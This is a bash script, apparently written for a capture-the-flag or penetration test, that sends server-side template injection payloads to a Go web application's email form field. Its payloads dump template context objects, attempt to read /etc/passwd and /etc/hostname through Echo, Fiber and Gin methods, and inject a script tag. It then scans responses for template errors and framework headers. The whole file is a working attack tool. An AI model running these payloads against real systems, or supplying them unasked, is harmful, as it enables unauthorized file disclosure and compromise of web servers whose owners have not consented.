#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if target URL was provided
if [ $# -eq 0 ]; then
    echo -e "${RED}Error: No target URL provided${NC}"
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

# Function to test a payload
test_payload() {
    local payload="$1"
    local description="$2"
    
    # URL encode the payload
    local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    
    echo -e "\n${BLUE}Testing: ${description}${NC}"
    echo -e "${YELLOW}Payload:${NC} $payload"
    
    # Make the request and capture both headers and body
    response=$(curl -s -i -X POST \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -d "email=$encoded_payload" \
         "$TARGET_URL")
    
    # Extract status code
    status_code=$(echo "$response" | grep "HTTP/" | awk '{print $2}')
    
    # Print status code
    echo -e "${YELLOW}Status:${NC} $status_code"
    
    # Check for interesting patterns
    if echo "$response" | grep -q -i "template:\|golang\|runtime error\|panic:"; then
        echo -e "${GREEN}Found template/golang error!${NC}"
        echo -e "${YELLOW}Response:${NC}"
        echo "$response" | grep -i "template:\|golang\|runtime error\|panic:" --color=auto
    fi
    
    # Check for framework headers
    if echo "$response" | grep -q -i "x-powered-by\|server:\|x-framework:"; then
        echo -e "${GREEN}Found framework headers!${NC}"
        echo -e "${YELLOW}Headers:${NC}"
        echo "$response" | grep -i "x-powered-by\|server:\|x-framework:" --color=auto
    fi
    
    # Print divider
    echo -e "${BLUE}----------------------------------------${NC}"
}

# Print banner
echo -e "${BLUE}=================================${NC}"
echo -e "${BLUE}Simple Golang SSTI Testing Tool${NC}"
echo -e "${BLUE}Target: $TARGET_URL${NC}"
echo -e "${BLUE}=================================${NC}"

# Basic tests
test_payload "{{.}}" "Basic object dump"
test_payload "test@{{.}}.com" "Basic object in email"
test_payload "{{.Email}}" "Email property"
test_payload "{{html \"0xdf\"}}" "HTML encoding test"

# Method tests
test_payload "{{.String}}" "String method"
test_payload "{{.ModifyEmail}}" "Modify email method"

# File read tests
test_payload '{{.File "/etc/passwd"}}' "File read attempt"
test_payload '{{.Attachment "/etc/passwd" "passwd"}}' "File attachment attempt"

# Object traversal
test_payload "{{.Request}}" "Request object"
test_payload "{{.Context}}" "Context object"

# Framework tests
test_payload '{{.Writer.WriteString "<script>alert(1)</script>"}}' "Writer test (Gin)"
test_payload '{{.Response.SendFile "/etc/hostname"}}' "SendFile test (Fiber)"

# Advanced tests
test_payload '{{$x:=.Echo.Filesystem.Open "/etc/passwd"}}{{$x.Read}}' "Advanced file read"
test_payload '{{.Stream 200 "text/plain" (.File "/etc/passwd")}}' "Stream test"

echo -e "\n${BLUE}Testing Complete${NC}"